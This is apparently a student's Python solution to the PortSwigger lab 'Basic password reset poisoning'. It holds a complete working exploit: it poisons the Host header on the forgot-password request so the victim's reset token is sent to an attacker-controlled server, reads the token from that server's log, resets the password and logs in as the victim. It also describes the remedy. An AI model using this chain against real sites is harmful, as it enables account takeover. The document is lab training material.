"""
Tristan Gomez - CS 595
Spring 2021

The code below solves the PortSwigger level: Basic password reset poisoning

Level Description:
    This lab is vulnerable to password reset poisoning. The user carlos will carelessly 
    click on any links in emails that he receives. To solve the lab, log in to Carlos's account.

    You can log in to your own account using the following credentials: wiener:peter. 
    Any emails sent to this account can be read via the email client on the exploit server. 

Vulnerability Description:
    The vulnerability of this lab is in the reset password functionality. When one posts a request to 
    the reset password form, you can change the host header to an arbitrary value. In this lab, I set
    the host header to the email client's address, and posted a request to reset Carlos' password. The
    temporary password reset token which uniquely identifies Carlos gets sent to my email client instead
    of Carlos. I then use his token in the reset password url. I changed his password to an arbitrary value,
    logged in as him and solved the level.  

Remediation:
    The site's back-end should properly validate the host header, checking it against a whitelist of 
    allowed domains. 
"""


"""
    I am importing 'requests' in order to send GET and POST requests. I am using
    'BeautifulSoup' to extract fields like csrf tokens from html pages. I am using
    're' to help with extracting specific text from html pages.
"""
import requests
from bs4 import BeautifulSoup
import re

site = "ac0f1f8c1f086d7180b0841900200085.web-security-academy.net"
s = requests.Session()

# This is the url I will exploit after stealing Carlos' password reset token.
forgot_password_link = f"https://{site}/forgot-password?temp-forgot-password-token="

"""
    Below, I am sending a GET request for the site's landing page so that way I can
    extract the link to the email client, which I will need later. 
"""
resp = s.get(f"https://{site}")
print(f"Get landing page status: {resp.status_code}")
soup = BeautifulSoup(resp.text,'html.parser')
email_client = soup.find('a', {'id':'exploit-link'}).get('href')
email_client = email_client.strip("https://")
email_client += "t"

"""
    Now, I am sending a get request for the /forgot-password page. I will
    use BeautifulSoup to extract the csrf token for the reset password form.
    I will also use my session object to get the '_lab' and 'session' cookies
    to add to my request. This is needed for authentication purposes. The site will
    give you a 403 Forbidden error if you do not include these cookies.
"""
resp = s.get(f"https://{site}/forgot-password")
print(f"Get /forgot-password page status: {resp.status_code}")
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')
cookie1 = s.cookies.get('_lab')
cookie2 = s.cookies.get('session')
Cookies = {"_lab" : cookie1 , "session" : cookie2}

exploit_data = {
    'csrf': csrf,
    'username' : 'carlos'
}

"""
    After extracting the csrf token, and packaging it into an exploit_data object along with 
    'carlos' as the value in the username field, I will send this data in the POST request to
    reset the password. This is where the exploit takes place. Notice that I am changing the 
    host header to have the value of my email client's address. This will cause me to be able to 
    intercept carlos' temporary reset token.
"""
resp = s.post(f"https://{site}/forgot-password", data=exploit_data, headers={'Host': f'{email_client}'}, cookies=Cookies,
allow_redirects=False)
print(f"Reset carlos' password status: {resp.status_code}")


"""
    After sending the form request to reset the password, I will extract carlos' reset token
    from the email client's log page. 
"""
resp = s.get(f'https://{email_client}/log')
temp_reset_token = re.findall(r"temp-forgot-password-token=[a-zA-Z0-9]*", resp.text)
temp = temp_reset_token[0].split("=")
temp_reset_token = temp[1]
print(f"Carlos reset token: {temp_reset_token}")


"""
    Now I will send a GET request to change the password, using carlos' token so I can change
    his password. I will also extract the csrf token for use when changing the password.
"""
resp = s.get(f'{forgot_password_link}{temp_reset_token}')
print(f"password reset status: {resp.status_code}")
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

reset_data = {
    'csrf' : csrf,
    'temp-forgot-password-token' : temp_reset_token,
    'new-password-1' : 'password',
    'new-password-2' : 'password'
}

"""
    After packaging up the stolen reset token, the form's csrf token, and the new password values 
    into a reset_data object, I will POST that data to the reset password form, thus changing Carlos'
    password to a value I control.
"""
resp = s.post(f"{forgot_password_link}{temp_reset_token}", data=reset_data)
print(f"change carlos's password status: {resp.status_code}")


"""
    Finally, I will send a GET request to the /login page to extract the login form's
    csrf token. I will package up the csrf token, carlos' username and the new password into
    a carlos_login_data_object which I will then POST to the login page. This action solves the level.
"""
resp = s.get(f'https://{site}/login')
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

carlos_login_data = {
    'csrf': csrf,
    'username': 'carlos',
    'password': 'password'
}

resp = s.post(f'https://{site}/login', data=carlos_login_data)
print(f"login as carlos status: {resp.status_code}")
